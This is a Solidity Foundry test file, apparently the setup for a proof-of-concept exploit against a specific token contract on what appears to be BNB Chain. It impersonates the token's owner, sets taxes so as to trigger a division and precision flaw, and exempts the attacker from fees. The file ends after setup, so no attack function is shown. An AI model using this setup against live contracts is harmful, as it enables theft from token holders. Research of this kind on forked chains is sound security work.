pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256) external;
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface Honey {
    function owner() external view returns (address);
    function setTradingStatus() external;
    function setSellTaxes(uint256, uint256, uint256, uint256, uint256) external;
    function setTaxes(uint256, uint256, uint256, uint256, uint256) external;
    function bulkExcludeFee(address[] memory, bool) external;
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function swapTokensAtAmount() external view returns (uint256);
    function pair() external view returns (address);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x6927BA6c0068Ca8584EeA45f2b5dF02ddecD1bEA;
    address attacker;
    address weth;
    address routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        attacker = address(this);
        // Setup: Impersonate owner and configure contract
        owner = Honey(TARGET).owner();
        vm.startPrank(owner);

        // Enable trading if not already enabled
        Honey(TARGET).setTradingStatus();

        // Set sell taxes to create denominator issue: liquidity=0, marketing=1, Stake=0, Dapp=0
        // This makes denominator = (0+1+0+0)*2 = 2
        // denominator - temp.liquidity = 2 - 0 = 2 (safe from division by zero but precision loss still possible)
        // Actually, to trigger the vulnerability more severely, we want denominator - temp.liquidity to be small
        // Let's set liquidity=0, marketing=0, Stake=1, Dapp=0 (sum=1, denominator=2, denominator-temp.liquidity=2)
        // Or better: liquidity=1, marketing=0, Stake=0, Dapp=0 (sum=1, denominator=2, denominator-temp.liquidity=1)
        Honey(TARGET).setSellTaxes(0, 0, 1, 0, 0); // rfi=0, marketing=0, liquidity=1, Stake=0, Dapp=0

        // Also set buy taxes similarly for consistency
        Honey(TARGET).setTaxes(0, 0, 1, 0, 0);

        // Exclude attacker from fees to avoid paying taxes during exploit
        address[] memory accounts = new address[](1);
        accounts[0] = attacker;
        Honey(TARGET).bulkExcludeFee(accounts, true);

        vm.stopPrank();

        // Provide some BNB to attacker for buying tokens
        deal(attacker, 10 ether);

        // Get WETH address from router
        weth = IRouter(routerAddress).WETH();
    }

